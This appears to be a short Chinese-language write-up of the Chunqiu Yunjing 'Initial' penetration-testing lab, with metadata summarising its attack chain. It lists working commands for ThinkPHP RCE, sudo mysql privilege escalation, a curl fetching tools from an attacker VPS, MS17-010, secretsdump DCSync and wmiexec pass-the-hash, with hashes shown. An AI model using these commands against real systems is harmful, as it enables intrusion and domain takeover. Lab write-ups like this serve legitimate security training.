---
title: 春秋云镜-Initial-WriteUp
contest: 春秋云镜靶场
year: 2023
difficulty: easy
vuln_type: rce
tags: [ThinkPHP 5.0.23, sudo mysql提权, frp代理, MS17-010, DCSync, 信呼OA]
attack_chain: fscan扫描→ThinkPHP5023 RCE→sudo mysql -e读flag1→frp代理进内网→MS17-010打XIAORANG-WIN7→secretsdump导出域管hash→wmiexec登录DC01读flag
key_payload: "fscan -h 172.22.2.1/24;ms17_010_eternalblue;secretsdump.py XIAORANG-WIN7$@172.22.1.2;wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8"
one_liner: 春秋云镜Initial：ThinkPHP5+MS17-010+secretsdump/wmiexec横向三件套
lesson: 入门靶场：web RCE→frp代理→MSF永恒之蓝→impacket工具链横向
quality: medium
---

# 春秋云镜-Initial-WriteUp

**靶场**：春秋云镜Initial（猫蛋儿安全，2023年12月）

**攻击链**：
1. **入口机39.98.209.209**：
   - `fscan -h 39.98.209.209` 扫到 ThinkPHP
   - `sudo /usr/bin/mysql -e '! cat /root/flag/flag01.txt'` 提权
2. **内网扫描**：
   - `curl http://vps:8001/fscan_amd64 -o fscan` 拉工具进内网
   - `fscan -h 172.22.2.1/24` 扫描发现 172.22.1.2(DC01域控) / 172.22.1.15(ThinkPHP) / 172.22.1.18(信呼OA) / 172.22.1.21(MS17-010)
3. **MS17-010打XIAORANG-WIN7**：
   - 抓到机器账户 XIAORANG-WIN7$: `d4df8a3fa73a9fee14a62123784290c6`
   - `secretsdump.py XIAORANG-WIN7$@172.22.1.2 -just-dc-user administrator -hashes :d4df8a3fa73a9fee14a62123784290c6`
   - 导出域管hash: `10cf89a850fb1cdbe6bb432b859164c8`
4. **登录DC01**：
   - `wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8`
   - 读 flag03.txt

**关键技术**：
- ThinkPHP 5023 method rce
- mysql -e '!' 提权读文件
- frp内网代理
- MSF MS17-010 + kiwi dcsync
- impacket secretsdump/wmiexec 横向

**质量评估**：中（命令payload完整，文字描述偏流水账）
